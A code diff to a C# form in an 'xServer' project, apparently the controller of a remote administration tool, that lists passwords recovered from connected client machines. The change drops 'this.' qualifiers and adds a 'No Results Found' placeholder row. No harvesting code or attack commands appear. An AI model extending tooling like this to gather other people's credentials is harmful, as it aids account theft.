@@ -14,6 +14,7 @@ namespace xServer.Forms
     {
         private readonly Client[] _clients;
         private readonly object _addingLock = new object();
+        private readonly RecoveredAccount _noResultsFound;
 
         public FrmPasswordRecovery(Client[] connectedClients)
         {
@@ -25,9 +26,17 @@ namespace xServer.Forms
             }
 
             InitializeComponent();
-            this.Text = WindowHelper.GetWindowTitle("Password Recovery", _clients.Length);
+            Text = WindowHelper.GetWindowTitle("Password Recovery", _clients.Length);
 
             txtFormat.Text = Settings.SaveFormat;
+
+            _noResultsFound = new RecoveredAccount()
+            {
+                Application = "No Results Found",
+                URL = "N/A",
+                Username = "N/A",
+                Password = "N/A"
+            };
         }
 
         private void FrmPasswordRecovery_Load(object sender, EventArgs e)
@@ -76,7 +85,7 @@ namespace xServer.Forms
                         if (lvg == null) //Create new group
                         {
                             lvg = new ListViewGroup { Name = acc.Application.Replace(" ", string.Empty), Header = acc.Application };
-                            this.Invoke(new MethodInvoker(() => lstPasswords.Groups.Add(lvg))); //Add the new group
+                            Invoke(new MethodInvoker(() => lstPasswords.Groups.Add(lvg))); //Add the new group
                         }
 
                         lvi.Group = lvg;
@@ -87,8 +96,25 @@ namespace xServer.Forms
                     UpdateRecoveryCount();
                 }
 
-                if (accounts.Length == 0)
-                    MessageBox.Show("Could not recover anything!", "Password Recovery", MessageBoxButtons.OK, MessageBoxIcon.Information);
+                if (accounts.Length == 0) //No accounts found
+                {
+                    var lvi = new ListViewItem { Tag = _noResultsFound, Text = identification };
+
+                    lvi.SubItems.Add(_noResultsFound.URL); // URL
+                    lvi.SubItems.Add(_noResultsFound.Username); // User
+                    lvi.SubItems.Add(_noResultsFound.Password); // Pass
+
+                    var lvg = GetGroupFromApplication(_noResultsFound.Application);
+
+                    if (lvg == null) //Create new group
+                    {
+                        lvg = new ListViewGroup { Name = _noResultsFound.Application, Header = _noResultsFound.Application };
+                        Invoke(new MethodInvoker(() => lstPasswords.Groups.Add(lvg))); //Add the new group
+                    }
+
+                    lvi.Group = lvg;
+                    Invoke(new MethodInvoker(() => { lstPasswords.Items.Add(lvi); }));
+                }
             }
             catch
             {
@@ -139,7 +165,7 @@ namespace xServer.Forms
         private ListViewGroup GetGroupFromApplication(string app)
         {
             ListViewGroup lvg = null;
-            this.Invoke(new MethodInvoker(delegate
+            Invoke(new MethodInvoker(delegate
             {
                 foreach (var @group in lstPasswords.Groups.Cast<ListViewGroup>().Where(@group => @group.Header == app))
                 {
